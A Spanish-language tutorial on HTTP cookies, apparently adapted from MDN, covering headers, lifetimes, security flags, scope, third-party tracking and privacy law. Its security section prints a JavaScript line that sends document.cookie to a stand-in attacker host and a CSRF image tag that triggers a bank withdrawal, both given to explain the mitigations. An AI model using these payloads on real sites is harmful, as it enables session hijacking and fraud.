# Las cookies HTTP

Las cookies HTTP son un pequeño pedazo de datos que un servidor manda al navegador de los usuarios, el
cual puede almanecarlo y volver a enviarlo junto con las siguientes peticiones a ese mismo servidor.
De forma general, son unadas para saber si dos peticiones vienen del mismo navegador (usuario) y
permitirle seguir con la sesión iniciada mientras navega por la web del servidor. Son una forma de
aportar persistencia a los datos, cosa que HTTP no soporta de forma nativa.

## Usos de las cookies:

Los usos más comunes de las cookies son:
* Administración de sesiones (Inicios de sesión de usuarios, carritos de compra...)
* Personalización (Preferencias de los usuarios)
* Seguimiento (Análisis del comportamiento de los usuarios)

En el pasado las cookies también se usaban como un medio de almacenamiento del lado del cliente, pero,
con la aparición de mejores alternativas (Web Storage API e IndexedDB) no tiene sentido usarlas con
este propósito, además, al enviarse las cookies con cada solicitud (request), pueden ocasionar un mal
rendimiento o una pérdida de datos móviles para los usuarios.

## Creación de cookies:

Cuando se recibe una petición HTTP, un servidor puede enviar una cabecera `set-cookie` con la
respuesta. Esta cookie generalmente es almacenada por el cliente y mandada con cada nueva petición al
mismo server mediante una cabecera `Cookie HTTP`. Además, se puede establecer un periodo de validez de
la misma, así como restricciones a dominios y rutas específicos.

### Las cabeceras `Set-Cookie`y `Cookie`

La cabecera de respuesta HTTP `Set-Cookie` es usada para mandar cookies desde el servidor al navegador del usuario. Una cookie simple se puede mandar de la siguiente manera:

`Set-Cookie: <cookie-name>=<cookie-value>`

El servidor dice al navegador que guarde una cookie. La respuesta del servidor será, en esencia, algo
así:

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Ahora, con cada petición a ese server, el navegador mandará todas las cookies anteriormente
establecidas para ese servidor usando la cabecera `Cookie`:

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### Cookies de sesión

La cookie creada en los ejemplos anteriores es una cookie de sesión (session cookie). Será borrada
cuando el cliente sea cerrado, por tanto, su ciclo de vida es sólo la sesión del cliente. Esto es así
porque no especifican ninguna directiva `Expires` o `Max-Age`. Sin embargo, en la actualidad muchos
navegadores ofrecen el servicio de restaurar la sesión, por lo que las cookies de este tipo se
comportarían como si fueran permanentes.

### Cookies permanentes

En lugar de expirar cuando el cliente es cerrado, las cookies permanentes expiran en una fecha
determinado (`Expires`) o tras un tiempo determinado (`Max-Age`)

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`

### Cookies seguras y HttpOnly

Una cookie segura sólo será enviada al servidor si la petición se hace mediante SSL y HTTPS. Es
importante destacar que no se deben mandar o transmitir mediante Cookies HTTP, puesto que este
protocolo no ofrece ningún tipo de seguridad.

Para prevenir ataques XSS, las cookies HTTP-Only no son accesibles via Javascript a través de
`Document.cookie`, `XMLHHttpRequest` o la API `Request`. Esta característica es conveniente cuando el
contenido de las cookies no va a ser usado por JavaScript (Por ejemplo, para cookies que definen una
sesión)

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`

### Ambiente de las cookies

Las directivas `Domain` y `Path` definen el ambiente de la cookie, o lo que es lo mismo, el conjunto
de URLs a las que las cookies deben mandarse.

`Domain` especifica aquellos hotsts a los que la cookie será enviada. Si no se especifica, por defecto
es la parte del host de la localización del documento actual, pero sin incluir subdominios. Cuando se
especifica el host, sí se incluyen los subdominios.

Si se especifica `Domain=mozilla.org`, las cookies son incluídas en subdominios como
`developer.mozilla.org`.

`Path` indica una ruta que debe existir en la petición si se quiere mandar una cookie a esa dirección.
El caracter '/' se interpreta como separador de directorios, los subdirectorios serán también válidos.

Si se establece `Path=/docs` las siguientes rutas serán aceptadas:

* "/docs"
* "/docs/web"
* "/docs/web/HTTP"

### Cookies SameSite (API EXPERIMENTAL)

Las cookies `SameSite` permiten a los servidores afirmar que una cookie no debe ser enviada con
peticiones de sitios cruzados. Esto da alguna protección frente a ataques CSRF.

### Acceso desde JavaScript usando Document.cookies

Nuevas cookies pueden ser creadas usando la propiedad `Document.cookie` y si la propiedad `HttpOnly`
no está activada, cookies existentes también pueden ser accedidas de esta manera.

```javascript
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```
Es importante destacar que esto conlleva riesgos en seguridad, puesto que estas cookies podrían ser
robadas mediante XSS.

## Seguridad

### Secuestro de sesión y XSS

Las cookies, como se ha dicho, son usadas muchas veces en una aplicación web para identificar a un
usuario y su sesión autentificada. Por este motivo, el robo de estas cookies puede suponer un posible
secuestro de la sesión autentificada del usuario. Una vía común para robar cookies es usando XSS o
ingeniería social.

```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
Una forma de evitar este riesgo es `HttpOnly`

### CSRF

Un buen ejemplo de CSRF puede ser una imagen que en realidad no lo sea, sino que el link a seguir sea
una petición a tu banco para que mandes dinero:

```javascript
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
Si estás logeado en el banco y las cookies todavía son válidas (y no hay más validaciones), se hará la transferencia tan pronto como cargues el HTML. Algunas formas de evitarlo son:

* El filtrado de la entrada
* Requerir confirmaciones para operaciones delicadas
* Las cookies usadas para operaciones delicadas deberían tener un corto periodo de vida.

## Seguimiento y privacidad

### Cookies "third-party"
Las cookies tienen un dominio asociado. Si ese dominio es el mismo que el dominio de la página en la
que estás, a estas cookies se les llama cookies "fist-party". Si es diferentes, son "third-party".

Mientras que las cookies "first-party" son mandadas sólo al servidor que las pone, una página web
puede contener imágenes u otros componentes en otros servidores. Las cookies mandadas a través de
estos componentes ajenos son llamadas "third-party" y son usadas generalmente para publicidad y
Seguimiento a través de la web. La mayoría de los navegadores permite las cookies "third-party" por
defecto, pero hay addons para bloquearlas.

El uso de estas cookies debe ser advertido para no dañar la confianza de los usuarios, además, existen
países con legislaciones al respecto.

### Do-Not-Track

No hay requerimientos legales o tecnológicos para su uso, pero la cabecera DNT puede ser usada para
señalar que una aplicación web debe deshabilitar su seguimiento o su seguimiento entre distintos
sitios para un usuario individual.

### Directiva europea de cookies

Los estados miembros europeos deben legislar a partir de esta directiva para asegurar que no se pueden
almacenar datos de un usuario sin el consentimiento explícito del mismo.

### Cookies zombies y Evercookies

Una aproximación más radical a las cookies son las Cookies zombies o Evercookies, las cuales son
recreadas tras su eliminación y son intencionadamente difíciles de eliminar. Se usan mediante la API
`Web storage API`, `Flash Local Shared Objects` y otras técnicas.
